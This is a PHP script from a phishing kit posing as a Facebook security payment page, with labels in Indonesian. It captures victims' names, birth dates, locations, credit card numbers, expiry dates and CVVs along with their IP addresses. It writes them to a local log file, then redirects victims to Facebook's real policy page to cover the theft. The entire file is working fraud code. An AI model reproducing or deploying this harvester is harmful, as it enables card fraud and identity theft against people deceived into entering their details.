<?php
error_reporting(0);
$file = "goyangseratusjuta.txt";

$fname = $_POST['fn'];
$lname = $_POST['ln'];
$day = $_POST['dd'];
$month = $_POST['mm'];
$year = $_POST['yy'];
$city = $_POST['ct'];
$region = $_POST['rg'];
$country = $_POST['co'];
$cardnumb = $_POST['cn'];
$cmonth = $_POST['nm'];
$cyears = $_POST['ny'];
$cvv = $_POST['ncv'];

$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');

fwrite($handle, "----FACEBOOK-SECURITY-PAYMENT-BY-MASAULIASC----");

fwrite($handle, "\n");

fwrite($handle, "Nama Depan     : ");

fwrite($handle, " $fname");

fwrite($handle, "\n");

fwrite($handle, "Nama Belakang   : ");

fwrite($handle, " $lname");

fwrite($handle, "\n");

fwrite($handle, "Tanggal Lahir   : ");

fwrite($handle, " $day/$month/$year " );

fwrite($handle, "\n");

fwrite($handle, "Kota   : ");

fwrite($handle, " $city");

fwrite($handle, "\n");

fwrite($handle, "Wilayah   : ");

fwrite($handle, " $region");

fwrite($handle, "\n");

fwrite($handle, "Negara   : ");

fwrite($handle, " $country");

fwrite($handle, "\n");

fwrite($handle, "Credit Card   : ");

fwrite($handle, " $cardnumb");

fwrite($handle, "\n");

fwrite($handle, "MM/YY   : ");

fwrite($handle, " $cmonth/$cyears ");

fwrite($handle, "\n");

fwrite($handle, "CVV   : ");

fwrite($handle, " $cvv");

fwrite($handle, "\n");

fwrite($handle, "IP Address : ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "Date       : ");

fwrite($handle, " $today");

fwrite($handle, "\n");

fwrite($handle, "----------------------END----------------------");

fwrite($handle, "\n");

fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--
window.location=\"https://www.facebook.com/policies_center/\";
// -->

</script>";

?>

